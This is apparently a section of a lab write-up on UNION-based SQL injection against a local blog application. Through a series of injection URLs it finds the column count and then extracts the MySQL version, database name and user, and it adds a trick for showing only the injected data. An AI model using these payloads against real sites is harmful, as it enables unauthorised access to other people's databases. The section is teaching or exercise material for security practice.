# (b) Get database version, name and user

For getting database version you need to be able to get information out throuth the Web interface.
To do that you have to use the **UNION** statement of MySQL. But *there is a catch**: the UNION statement requieres that the number of columns in the first query to be the same that in the second query.
So you first have to identify the number of columns of a single post.
Watching the post is the first aproach for that. You can see for example tha the post title is a column, and others might be:
- creation date,
- user avatar,
- user name,
- post title,
- post body,
- the tags of the post.

At least 7 columns.
Then we can do this:

```shell
http://localhost:8080/p/2 UNION SELECT 1,2,3,4,5,6,7/slug-name-post'
```

And we get this error for response:
```javascript
{
  "status": "Error",
  "message": "ER_WRONG_NUMBER_OF_COLUMNS_IN_SELECT: The used SELECT statements have a different number of columns"
}
```

This error indicate that the number of columns is not correct. So we keep adding numbers until we stop getting this erros

```shell
http://localhost:8080/p/2 UNION SELECT 1,2,3,4,5,6,7,8,9,10/slug-name-post'
```

We can see that the right number of columns is 10. Great! 

You should see the numbers, most of them al least in de screen somewhere.

Ok, now for the **engine version** just replace one of the number with a query, like this, assuming that the number two is being shown:

```shell
http://localhost:8080/p/2 UNION SELECT 1,version(),3,4,5,6,7,8,9,10/slug-name-post'
```

For the **database name** just replace one of the number with another query, like this:

```shell
http://localhost:8080/p/2 UNION SELECT 1,database(),3,4,5,6,7,8,9,10/slug-name-post'
```

And finally, for the **user** you can do this:

```shell
http://localhost:8080/p/2 UNION SELECT 1,user(),3,4,5,6,7,8,9,10/slug-name-post'
```

Finally, a little trick to display de information in a cleaner screen is to change the post number for another that does not exist, may be -1 or 10000, like this:

```shell
http://localhost:8080/p/-1 UNION SELECT 1,2,3,4,5,6,7,8,9,10/slug-name-post'
```

This way all you get is the data you want.
